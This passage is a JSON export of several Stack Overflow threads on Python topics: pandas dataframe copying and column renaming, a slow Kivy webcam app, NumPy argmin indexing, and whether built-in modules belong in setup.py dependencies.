of <a href=\"https://stackoverflow.com/questions/2612802/how-to-clone-or-copy-a-list\">How to clone or copy a list?</a>"}, {"owner": {"reputation": 63658, "user_id": 5014455, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JTknr.png?s=128&g=1", "display_name": "juanpa.arrivillaga", "link": "https://stackoverflow.com/users/5014455/juanpa-arrivillaga"}, "edited": false, "score": 0, "creation_date": 1571866576, "post_id": 58531273, "comment_id": 103386375, "body": "<code>data_model = data2</code> simply says &quot;the name <code>data_model</code> now refers to the object referenced by <code>data2</code>. Note, in the future, please always tag any python related questions with the generic [python] tag"}, {"owner": {"reputation": 21, "user_id": 10081864, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-l_I8y42F5EM/AAAAAAAAAAI/AAAAAAAAAGI/3MDh2Go8foY/photo.jpg?sz=128", "display_name": "Abhik Mitra", "link": "https://stackoverflow.com/users/10081864/abhik-mitra"}, "reply_to_user": {"reputation": 63658, "user_id": 5014455, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JTknr.png?s=128&g=1", "display_name": "juanpa.arrivillaga", "link": "https://stackoverflow.com/users/5014455/juanpa-arrivillaga"}, "edited": false, "score": 0, "creation_date": 1571954734, "post_id": 58531273, "comment_id": 103420289, "body": "I did. Are you suggesting that I should put up a generic [python] tag only for such questions?"}, {"owner": {"reputation": 63658, "user_id": 5014455, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JTknr.png?s=128&g=1", "display_name": "juanpa.arrivillaga", "link": "https://stackoverflow.com/users/5014455/juanpa-arrivillaga"}, "edited": false, "score": 0, "creation_date": 1571959471, "post_id": 58531273, "comment_id": 103421428, "body": "No, you did not. You can see in the <a href=\"https://stackoverflow.com/posts/58531273/revisions\">revision history</a> that I added the generic tag."}], "answers": [{"tags": [], "owner": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "is_accepted": false, "score": 0, "last_activity_date": 1571866599, "creation_date": 1571866599, "answer_id": 58531301, "question_id": 58531273, "link": "https://stackoverflow.com/questions/58531273/why-do-the-changes-made-in-one-variable-result-in-the-changes-in-related-variabl/58531301#58531301", "title": "Why do the changes made in one variable result in the changes in related variables?", "body": "<p>Yes, <code>data_model = data2</code> is just a pointer and does not create a copy, therefore editing one is also editing the other... you have to use this: </p>\n\n<pre><code>data_model = data2.copy()\n</code></pre>\n\n<p>And read the <a href=\"https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.copy.html\" rel=\"nofollow noreferrer\">docs here</a></p>\n"}], "owner": {"reputation": 21, "user_id": 10081864, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-l_I8y42F5EM/AAAAAAAAAAI/AAAAAAAAAGI/3MDh2Go8foY/photo.jpg?sz=128", "display_name": "Abhik Mitra", "link": "https://stackoverflow.com/users/10081864/abhik-mitra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 23, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1571866599, "creation_date": 1571866413, "last_edit_date": 1571866531, "question_id": 58531273, "link": "https://stackoverflow.com/questions/58531273/why-do-the-changes-made-in-one-variable-result-in-the-changes-in-related-variabl", "title": "Why do the changes made in one variable result in the changes in related variables?", "body": "<p>I have run a code as follows:\ndata_model = data2</p>\n\n<p>data_model.drop(\"Sale\",axis = 1,inplace = True)\nThis results in the removal of sale column from the data_model dataframe as well as the data2 dataframe. why? does it act like a pointer to data2</p>\n"}, {"tags": ["python", "kivy"], "owner": {"reputation": 21, "user_id": 10908984, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1cc7e4cf22fad32af6d255f14320a305?s=128&d=identicon&r=PG&f=1", "display_name": "Mason_Schellenberg", "link": "https://stackoverflow.com/users/10908984/mason-schellenberg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 116, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1571866374, "creation_date": 1571866374, "question_id": 58531268, "link": "https://stackoverflow.com/questions/58531268/trouble-with-slow-kivy-app-to-view-webcam-in-real-time", "title": "Trouble with slow kivy app to view webcam in real time", "body": "<p>I am trying to make a kivy app to display images grabbed from a webcam in real time. It works, but is slow, and I am wondering in anyone knows how to fix this or knows of a different method to use. By slow, I mean that there is a large delay between successive images being displayed.</p>\n\n<p>The code is simple, just consists of a rectangle on which the image grabbed from a camera is displayed via texture.blit_buffer . There is a 'Play' button to start and stop image display.</p>\n\n<p>I have scheduled the texture on the rectangle to be updated every 0.02s, and using pythons time module I was able to time the execution of the function that updates the texture. The function is called and executes about every 0.02s, so the issue is not the function itself being slow. This is where I am hung up. What else is causing this to update the displayed image so slowly?</p>\n\n<p>Anyway, here is the .py file</p>\n\n<pre><code>import numpy as np\nimport cv2\n\nfrom kivy.app import App\nfrom kivy.uix.widget import Widget \n\nfrom kivy.core.window import Window \nfrom kivy.uix.button import Button\nfrom kivy.graphics.texture import Texture\nfrom kivy.clock import Clock\n\nfrom kivy.properties import NumericProperty\n\nimport time\n\n\nclass WebcamGUI(Widget):\n\n    IsPlaying = False\n    Event = None\n\n    Size_x = 640\n    Size_y = 480\n\n    texture = Texture.create(size=(Size_x,Size_y),colorfmt='bgr')\n    frame = np.ones(shape=[Size_x, Size_y, 3], dtype=np.uint8)\n    data = frame.tostring()\n    texture.blit_buffer(data, colorfmt='bgr', bufferfmt='ubyte')\n\n    cap = cv2.VideoCapture(0)\n\n    t = time.time()\n\n    def GetFrame(self,dt):\n        ret, frame = self.cap.read()\n        frame1 = cv2.flip(frame, 0)\n        data = frame1.tostring()\n        self.texture.blit_buffer(data, colorfmt='bgr', bufferfmt='ubyte')\n        print(time.time()-self.t)\n        self.t = time.time()\n\n    def Play(self):\n        self.IsPlaying = not self.IsPlaying\n        if self.IsPlaying:\n            self.Event = Clock.schedule_interval(self.GetFrame,0.02)\n        else:\n            self.Event.cancel()\n\nclass WebcamGUIApp(App):\n    def build(self):\n        GUI = WebcamGUI()\n        return GUI\n\n    def on_stop(self):\n        self.cap.release()\n\nif __name__ == '__main__':\n    Window.fullscreen = False\n    WebcamGUIApp().run()\n    cv2.destroyAllWindows()\n\n</code></pre>\n\n<p>Here is the .kv file:</p>\n\n<pre><code>#:kivy 1.0.9\n\n&lt;WebcamGUI&gt;:\n    canvas:\n        Rectangle:\n            pos: 100,100\n            size: self.Size_x,self.Size_y   \n            texture: self.texture   \n    ToggleButton:\n        pos: (10,10)\n        size: 100,25\n        text: \"Play\"\n        on_press: root.Play()\n</code></pre>\n"}, {"tags": ["python", "python-3.x", "numpy"], "comments": [{"owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 0, "creation_date": 1571866843, "post_id": 58531243, "comment_id": 103386439, "body": "Could you please include a [minimal reproducible example ](/help/mcve), especially specifying inputs and expected output?"}, {"owner": {"reputation": 17, "user_id": 12264554, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/46e084381701af464d5d3663393fe571?s=128&d=identicon&r=PG&f=1", "display_name": "JonnyEnglish", "link": "https://stackoverflow.com/users/12264554/jonnyenglish"}, "reply_to_user": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 0, "creation_date": 1571867558, "post_id": 58531243, "comment_id": 103386660, "body": "@norok2 Hello, I added some inputs in my question."}, {"owner": {"reputation": 23220, "user_id": 1004096, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/d0bd5ec4d97233e5f9f5f74bd6f02357?s=128&d=identicon&r=PG", "display_name": "Bi Rico", "link": "https://stackoverflow.com/users/1004096/bi-rico"}, "edited": false, "score": 2, "creation_date": 1571868934, "post_id": 58531243, "comment_id": 103387047, "body": "It&#39;s still not clear what you&#39;re trying to do, and it&#39;s not clear why a &amp; b have shape (100,); (100,). Each array should have one shape."}, {"owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 1, "creation_date": 1571869237, "post_id": 58531243, "comment_id": 103387120, "body": "@JonnyEnglish I&#39;d stress the need for minimality here. Try to use a small and simple <i>toy</i> example that still reproduce the issue."}, {"owner": {"reputation": 2479, "user_id": 11301900, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8826c4b7675bd83127fddefc109b7f5d?s=128&d=identicon&r=PG&f=1", "display_name": "AMC", "link": "https://stackoverflow.com/users/11301900/amc"}, "reply_to_user": {"reputation": 23220, "user_id": 1004096, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/d0bd5ec4d97233e5f9f5f74bd6f02357?s=128&d=identicon&r=PG", "display_name": "Bi Rico", "link": "https://stackoverflow.com/users/1004096/bi-rico"}, "edited": false, "score": 0, "creation_date": 1571882044, "post_id": 58531243, "comment_id": 103389531, "body": "I second the comment by @BiRico, the description of the shapes of the arrays make no sense. Your title is also off whack, I will try to suggest an edit. Finally, your example of the &quot;form of the output&quot; is probably incorrect."}], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 12264554, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/46e084381701af464d5d3663393fe571?s=128&d=identicon&r=PG&f=1", "display_name": "JonnyEnglish", "link": "https://stackoverflow.com/users/12264554/jonnyenglish"}, "edited": false, "score": 0, "creation_date": 1571866697, "post_id": 58531258, "comment_id": 103386404, "body": "Hello, sadly this did not work for me, the output is still somthing like this [4] [4] [1] [0] [0] [1]"}], "tags": [], "owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "is_accepted": false, "score": 0, "last_activity_date": 1571866344, "creation_date": 1571866344, "answer_id": 58531258, "question_id": 58531243, "link": "https://stackoverflow.com/questions/58531243/how-can-change-the-type-of-an-array/58531258#58531258", "title": "How can change the type of an array?", "body": "<p>Use <a href=\"https://docs.scipy.org/doc/numpy/reference/generated/numpy.ndarray.astype.html\" rel=\"nofollow noreferrer\"><code>.astype()</code></a>:</p>\n\n<pre><code>return b[index].astype(int)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 24576, "user_id": 3767239, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/f7cdefb47f96069d7add1222c70f3f70?s=128&d=identicon&r=PG&f=1", "display_name": "a_guest", "link": "https://stackoverflow.com/users/3767239/a-guest"}, "is_accepted": false, "score": -1, "last_activity_date": 1571869219, "creation_date": 1571869219, "answer_id": 58531675, "question_id": 58531243, "link": "https://stackoverflow.com/questions/58531243/how-can-change-the-type-of-an-array/58531675#58531675", "title": "How can change the type of an array?", "body": "<p>You can use <code>np.argmin</code> and use it to index into <code>b</code>:</p>\n\n<pre><code>b[range(len(b)), np.argmin(a, axis=1)]\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2479, "user_id": 11301900, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8826c4b7675bd83127fddefc109b7f5d?s=128&d=identicon&r=PG&f=1", "display_name": "AMC", "link": "https://stackoverflow.com/users/11301900/amc"}, "is_accepted": false, "score": 0, "last_activity_date": 1571883001, "last_edit_date": 1571883001, "creation_date": 1571882614, "answer_id": 58533133, "question_id": 58531243, "link": "https://stackoverflow.com/questions/58531243/how-can-change-the-type-of-an-array/58533133#58533133", "title": "How can change the type of an array?", "body": "<p>Here is an example solution on arrays of random integers.</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>arr_1 = np.random.randint(low=0, high=20, size=(4, 3))\narr_2 = np.random.randint(low=0, high=20, size=(4, 3))\n\narr_1_min_inds = np.argmin(arr_1, axis=1)\n\narr_2_res = arr_2[np.arange(arr_1_min_inds.shape[0]), arr_1_min_inds]\n</code></pre>\n"}], "owner": {"reputation": 17, "user_id": 12264554, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/46e084381701af464d5d3663393fe571?s=128&d=identicon&r=PG&f=1", "display_name": "JonnyEnglish", "link": "https://stackoverflow.com/users/12264554/jonnyenglish"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 56, "favorite_count": 0, "answer_count": 3, "score": -1, "last_activity_date": 1571883001, "creation_date": 1571866214, "last_edit_date": 1571868857, "question_id": 58531243, "link": "https://stackoverflow.com/questions/58531243/how-can-change-the-type-of-an-array", "title": "How can change the type of an array?", "body": "<p>the title is a little bit wrong, but I had no idea what else I could use, sry.</p>\n\n<p>What I have:\nI have a function k with two inputs a and b with the same type \"class 'numpy.ndarray'\"  and the same shape, who looks like this :</p>\n\n<p>(100,)</p>\n\n<p>(100,)</p>\n\n<p>(100,)</p>\n\n<p>(100,)</p>\n\n<p>...</p>\n\n<p>The coal is it to find the minimum of each vector  (shape = (100,)) of a and find the Element on b with the index of the minimum of a.</p>\n\n<p>So if the first vector of a has his minimum on position [35], we want the element on position [35] but from the first vector of b.</p>\n\n<p>I hope this makes sense? </p>\n\n<p>In the End I would like to have integers.</p>\n\n<p>Edit:</p>\n\n<p>Here some example inputs</p>\n\n<pre><code>a = [[0.24875591 0.16306678 0.78364326 ... 0.65339055 0.36671955 0.79556977]\n [0.01090705 0.48027704 0.09681013 ... 0.19689527 0.88788462 0.64784676]\n [0.0277094  0.63714653 0.87690794 ... 0.4202944  0.52492127 0.65170223]\n ...\n [0.75916264 0.99673363 0.2800721  ... 0.7501566  0.98627157 0.06429751]\n [0.2447071  0.57766005 0.77387911 ... 0.1023757  0.71880919 0.45419627]\n [0.31396027 0.26280255 0.13444513 ... 0.51871024 0.26153987 0.63990427]]\n[[0.24875591 0.16306678 0.78364326 ... 0.65339055 0.36671955 0.79556977]\n [0.01090705 0.48027704 0.09681013 ... 0.19689527 0.88788462 0.64784676]\n [0.0277094  0.63714653 0.87690794 ... 0.4202944  0.52492127 0.65170223]\n ...\n [0.75916264 0.99673363 0.2800721  ... 0.7501566  0.98627157 0.06429751]\n [0.2447071  0.57766005 0.77387911 ... 0.1023757  0.71880919 0.45419627]\n [0.31396027 0.26280255 0.13444513 ... 0.51871024 0.26153987 0.63990427]]\n</code></pre>\n\n<p>The shape of a is: </p>\n\n<p>(100,)</p>\n\n<p>(100,)</p>\n\n<pre><code>b = \n[1 0 0 0 1 0 0 1 0 0 1 0 1 0 0 1 0 1 1 1 0 1 1 0 1 0 1 1 0 1 0 1 0 1 0 1 1\n 1 1 0 1 1 1 0 1 1 1 1 0 0 1 0 0 0 1 0 0 1 1 1 0 0 0 0 1 1 1 0 0 0 0 0 0 0\n 0 0 1 1 0 1 0 0 1 1 1 1 1 0 0 1 1 0 0 0 0 0 1 1 1 0]\n[1 0 0 0 1 0 0 1 0 0 1 0 1 0 0 1 0 1 1 1 0 1 1 0 1 0 1 1 0 1 0 1 0 1 0 1 1\n 1 1 0 1 1 1 0 1 1 1 1 0 0 1 0 0 0 1 0 0 1 1 1 0 0 0 0 1 1 1 0 0 0 0 0 0 0\n 0 0 1 1 0 1 0 0 1 1 1 1 1 0 0 1 1 0 0 0 0 0 1 1 1 0]\n</code></pre>\n\n<p>The shape of b is:</p>\n\n<p>(100,)</p>\n\n<p>(100,)</p>\n\n<p>The form of the output should be something like this</p>\n\n<pre><code>0\n1\n0\n1\n1\n...\n</code></pre>\n"}, {"tags": ["python", "pip", "setup.py", "python-wheel"], "answers": [{"comments": [{"owner": {"reputation": 6510, "user_id": 5889131, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/S0TUH.jpg?s=128&g=1", "display_name": "jeremysprofile", "link": "https://stackoverflow.com/users/5889131/jeremysprofile"}, "edited": false, "score": 0, "creation_date": 1571869696, "post_id": 58531427, "comment_id": 103387246, "body": "1. The wheel I download is <code>datetime</code>, but the package I import from it is called <code>DateTime</code>, is that correct? 2. Regarding differentiating, I meant, &quot;How do I tell which packages to list in <code>install_requires</code>? Is there a way to know that a package is builtin other than making a virtualenv and checking if it&#39;s available?&quot;"}, {"owner": {"reputation": 6510, "user_id": 5889131, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/S0TUH.jpg?s=128&g=1", "display_name": "jeremysprofile", "link": "https://stackoverflow.com/users/5889131/jeremysprofile"}, "edited": false, "score": 0, "creation_date": 1571870179, "post_id": 58531427, "comment_id": 103387358, "body": "Nevermind on question 1. I see that it is in fact called <code>DateTime</code>, it&#39;s just that pip is case insensitive and doesn&#39;t care if I type <code>pip install dAtEtImE</code>, it&#39;d still get me to that project. Still confused on point 2, however."}, {"owner": {"reputation": 55797, "user_id": 7976758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/512cfbaf98d63ca4acd57b2df792aec6?s=128&d=identicon&r=PG", "display_name": "phd", "link": "https://stackoverflow.com/users/7976758/phd"}, "reply_to_user": {"reputation": 6510, "user_id": 5889131, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/S0TUH.jpg?s=128&g=1", "display_name": "jeremysprofile", "link": "https://stackoverflow.com/users/5889131/jeremysprofile"}, "edited": false, "score": 1, "creation_date": 1571913914, "post_id": 58531427, "comment_id": 103401179, "body": "Builtin and standard commands are listed in the docs: <a href=\"https://docs.python.org/3/library/index.html\" rel=\"nofollow noreferrer\">docs.python.org/3/library/index.html</a> Choose the proper version of Python \u2014 every new release adds (and often obsoletes) modules."}], "tags": [], "owner": {"reputation": 55797, "user_id": 7976758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/512cfbaf98d63ca4acd57b2df792aec6?s=128&d=identicon&r=PG", "display_name": "phd", "link": "https://stackoverflow.com/users/7976758/phd"}, "is_accepted": true, "score": 2, "last_activity_date": 1571928332, "last_edit_date": 1571928332, "creation_date": 1571867371, "answer_id": 58531427, "question_id": 58531236, "link": "https://stackoverflow.com/questions/58531236/setup-py-install-requires-built-in-package-include-or-omit/58531427#58531427", "title": "setup.py install_requires built-in package: include or omit?", "body": "<blockquote>\n  <p>it appears to download the pypi package datetime</p>\n</blockquote>\n\n<p>Not exactly. It downloads a package called <code>DateTime</code> with top-level name <code>DateTime</code>, not <code>datetime</code>.</p>\n\n<blockquote>\n  <p>Should I include builtin packages under <code>install_requires</code> if I use them?</p>\n</blockquote>\n\n<p>No. <code>install_requires</code> is intended to list external, 3rd-party packages, not the builtin ones, not the standard ones.</p>\n\n<blockquote>\n  <p>Is there an easier way of seeing which packages are builtin and which aren't?</p>\n</blockquote>\n\n<p>One is <code>datetime</code>, the other is <code>DateTime</code>.</p>\n\n<blockquote>\n  <p>Who owns the pypi versions of these builtin packages? </p>\n</blockquote>\n\n<p>The page <a href=\"https://pypi.org/project/DateTime/\" rel=\"nofollow noreferrer\">https://pypi.org/project/DateTime/</a> name the author: Zope Foundation and Contributors. And list the current maintainers. The homepage listed is <a href=\"https://github.com/zopefoundation/DateTime\" rel=\"nofollow noreferrer\">https://github.com/zopefoundation/DateTime</a></p>\n"}], "owner": {"reputation": 6510, "user_id": 5889131, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/S0TUH.jpg?s=128&g=1", "display_name": "jeremysprofile", "link": "https://stackoverflow.com/users/5889131/jeremysprofile"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 143, "favorite_count": 0, "accepted_answer_id": 58531427, "answer_count": 1, "score": 0, "last_activity_date": 1571928332, "creation_date": 1571866173, "question_id": 58531236, "link": "https://stackoverflow.com/questions/58531236/setup-py-install-requires-built-in-package-include-or-omit", "title": "setup.py install_requires built-in package: include or omit?", "body": "<p>I have a python package I made. It uses <code>datetime</code> in multiple places. I notice that on a brand-new python install, I can do <code>import datetime</code> without issue. Thus, python comes with <code>datetime</code> built-in.</p>\n\n<p>If I put <code>datetime</code> in my setup.py as one of the items in <code>install_requires</code>, it appears to download the pypi package <code>datetime</code>, even though the builtin package is already available. In some cases, such as with <code>multiprocessing</code>, the pypi package might require extra things (in the case of the pypi<code>multiprocessing</code>, it requires <code>gcc-c++</code> to be installed on my CentOS, while the builtin <code>multiprocessing</code> has no such requirements).</p>\n\n<p>Questions:</p>\n\n<ul>\n<li>Should I include builtin packages under <code>install_requires</code> if I use them?</li>\n<li>Is there an easier way of seeing which packages are builtin and which aren't other than creating a new <code>virtualenv</code> and trying to import things?</li>\n<li>Who owns the pypi versions of these builtin packages? Is it some random person, or are these vetted packages provided by the python core team? (I know arbitrary packages can be provided by random people, but I can't figure out if that's true for the builtin packages that are also available on pypi.)</li>\n</ul>\n"}, {"tags": ["python", "pandas"], "comments": [{"owner": {"reputation": 1151, "user_id": 3280146, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c4f2d0cfdd2ef32ac2535401d781e7a?s=128&d=identicon&r=PG&f=1", "display_name": "pradip", "link": "https://stackoverflow.com/users/3280146/pradip"}, "edited": false, "score": 0, "creation_date": 1571866401, "post_id": 58531235, "comment_id": 103386322, "body": "how about using <code>df.reindex</code> ? or simply renaming the columns again ?"}, {"owner": {"reputation": 4056, "user_id": 10521959, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DymiN.png?s=128&g=1", "display_name": "Yaakov Bressler", "link": "https://stackoverflow.com/users/10521959/yaakov-bressler"}, "reply_to_user": {"reputation": 1151, "user_id": 3280146, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c4f2d0cfdd2ef32ac2535401d781e7a?s=128&d=identicon&r=PG&f=1", "display_name": "pradip", "link": "https://stackoverflow.com/users/3280146/pradip"}, "edited": false, "score": 0, "creation_date": 1571866714, "post_id": 58531235, "comment_id": 103386411, "body": "<i>I&#39;m not familiar with reindexing.</i> Renaming would be difficult with a massive df."}, {"owner": {"reputation": 46860, "user_id": 4333359, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/231e42e97a07b2937c1bf8a313dfa3f7?s=128&d=identicon&r=PG&f=1", "display_name": "ALollz", "link": "https://stackoverflow.com/users/4333359/alollz"}, "edited": false, "score": 0, "creation_date": 1571867859, "post_id": 58531235, "comment_id": 103386761, "body": "By massive do you mean massive in terms of the number of columns, or there&#39;s just a lot of rows? I feel like adjusting just the <code>df.columns</code> Index object would be extremely fast."}, {"owner": {"reputation": 1723, "user_id": 6580543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c2d26bb59afa57a4a08d5000af6391d?s=128&d=identicon&r=PG&f=1", "display_name": "mitoRibo", "link": "https://stackoverflow.com/users/6580543/mitoribo"}, "edited": false, "score": 1, "creation_date": 1571869594, "post_id": 58531235, "comment_id": 103387220, "body": "Would <code>df.rename(name_map, inplace=True)</code> be faster? you&#39;d have to construct <code>name_map</code> to be a dict keyed by current col name and valued by the new col name"}], "answers": [{"tags": [], "owner": {"reputation": 530, "user_id": 11363397, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1cce147ac9e935039ef6b38c4ee0c40a?s=128&d=identicon&r=PG&f=1", "display_name": "elembie", "link": "https://stackoverflow.com/users/11363397/elembie"}, "is_accepted": true, "score": 1, "last_activity_date": 1571869229, "creation_date": 1571869229, "answer_id": 58531676, "question_id": 58531235, "link": "https://stackoverflow.com/questions/58531235/is-there-a-better-way-to-manipulate-column-names-in-a-pandas-dataframe/58531676#58531676", "title": "Is there a better way to manipulate column names in a pandas dataframe?", "body": "<p>You could define a <code>clean</code> function and just apply to all the columns using list comprehension.</p>\n\n<pre><code>def clean(name):\n\n  name = name.split('(')[0] if ' (' in name else name\n  name = '_'.join(name.split())\n  return name\n\ndf.columns = [clean(col) for col in df.columns]\n</code></pre>\n\n<p>It's clear what's happening and not overly verbose.</p>\n"}], "owner": {"reputation": 4056, "user_id": 10521959, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DymiN.png?s=128&g=1", "display_name": "Yaakov Bressler", "link": "https://stackoverflow.com/users/10521959/yaakov-bressler"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 114, "favorite_count": 0, "accepted_answer_id": 58531676, "answer_count": 1, "score": 1, "last_activity_date": 1571869229, "creation_date": 1571866156, "question_id": 58531235, "link": "https://stackoverflow.com/questions/58531235/is-there-a-better-way-to-manipulate-column-names-in-a-pandas-dataframe", "title": "Is there a better way to manipulate column names in a pandas dataframe?", "body": "<p>I'm working with a large dataframe and need a way to dynamically rename column names. </p>\n\n<p><em>Here's a slow method I'm working with:</em></p>\n\n<pre><code># Create a sample dataframe\ndf = pd.DataFrame.from_records([\n    {'Name':'Jay','Favorite Color (BLAH)':'Green'},\n    {'Name':'Shay','Favorite Color (BLAH)':'Blue'},\n    {'Name':'Ray','Favorite Color (BLAH)':'Yellow'},\n])\n\n# Current columns are: ['Name', 'Favorite Color (BLAH)']\n\n# ------\n\n# build two lambdas to clean the column names\nf_clean = lambda x: x.split('(')[0] if ' (' in x else x\nf_join = lambda x: '_'.join(x.split())\ndf.columns = df.columns.map(f_clean, f_join).map(f_join).str.lower()\n\n# Columns are now: ['name', 'favorite_color']\n</code></pre>\n\n<p><strong>Is there a better method for solving this?</strong></p>\n"}, {"tags": ["python", "pandas", "dataframe", "text-processing"], "comments": [{"owner": {"reputation": 10847, "user_id": 4799172, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/17539586d5bb4e528d94f3bc4131e6c0?s=128&d=identicon&r=PG&f=1", "display_name": "roganjosh", "link": "https://stackoverflow.com/users/4799172/roganjosh"}, "edited": false, "score": 0, "creation_date": 1571866553, "post_id": 58531223, "comment_id": 103386371, "body": "A bit stumped on this one. You might be able to go down the route of groupby with the start and end indices, and work on each group, but many of the <code>str</code> methods in pandas as really slow, so I&#39;m not sure it will be better than <code>apply</code>. Did you try something like this?"}, {"owner": {"reputation": 1151, "user_id": 3280146, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c4f2d0cfdd2ef32ac2535401d781e7a?s=128&d=identicon&r=PG&f=1", "display_name": "pradip", "link": "https://stackoverflow.com/users/3280146/pradip"}, "edited": false, "score": 0, "creation_date": 1571866619, "post_id": 58531223, "comment_id": 103386390, "body": "what&#39;s the condition ?"}, {"owner": {"reputation": 10847, "user_id": 4799172, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/17539586d5bb4e528d94f3bc4131e6c0?s=128&d=identicon&r=PG&f=1", "display_name": "roganjosh", "link": "https://stackoverflow.com/users/4799172/roganjosh"}, "reply_to_user": {"reputation": 1151, "user_id": 3280146, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c4f2d0cfdd2ef32ac2535401d781e7a?s=128&d=identicon&r=PG&f=1", "display_name": "pradip", "link": "https://stackoverflow.com/users/3280146/pradip"}, "edited": false, "score": 0, "creation_date": 1571866737, "post_id": 58531223, "comment_id": 103386418, "body": "@user3280146 ? They just need to slice the strings with the given indices. I&#39;d say the question is pretty clear."}, {"owner": {"reputation": 1151, "user_id": 3280146, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c4f2d0cfdd2ef32ac2535401d781e7a?s=128&d=identicon&r=PG&f=1", "display_name": "pradip", "link": "https://stackoverflow.com/users/3280146/pradip"}, "edited": false, "score": 0, "creation_date": 1571867182, "post_id": 58531223, "comment_id": 103386553, "body": "It says based in the value of b and c. Does it means that from column &quot;a&quot;, the slicing should be one of the values either from column b and c. Sample output would be more easier to understand..."}, {"owner": {"reputation": 4746, "user_id": 8474894, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3480af9d214a7d6f6a8cb9ef821b1f24?s=128&d=identicon&r=PG&f=1", "display_name": "CypherX", "link": "https://stackoverflow.com/users/8474894/cypherx"}, "edited": false, "score": 0, "creation_date": 1571867403, "post_id": 58531223, "comment_id": 103386620, "body": "You said it is slow. What is the time taken for 1 million rows? I am trying to understand how slow is &quot;slow&quot;. It will help us ballpark speed and compare any solution posted, as people mostly cannot access 100 million rows of data."}, {"owner": {"reputation": 10847, "user_id": 4799172, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/17539586d5bb4e528d94f3bc4131e6c0?s=128&d=identicon&r=PG&f=1", "display_name": "roganjosh", "link": "https://stackoverflow.com/users/4799172/roganjosh"}, "reply_to_user": {"reputation": 1151, "user_id": 3280146, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c4f2d0cfdd2ef32ac2535401d781e7a?s=128&d=identicon&r=PG&f=1", "display_name": "pradip", "link": "https://stackoverflow.com/users/3280146/pradip"}, "edited": false, "score": 0, "creation_date": 1571867407, "post_id": 58531223, "comment_id": 103386621, "body": "@user3280146 <code>df[&#39;d&#39;] 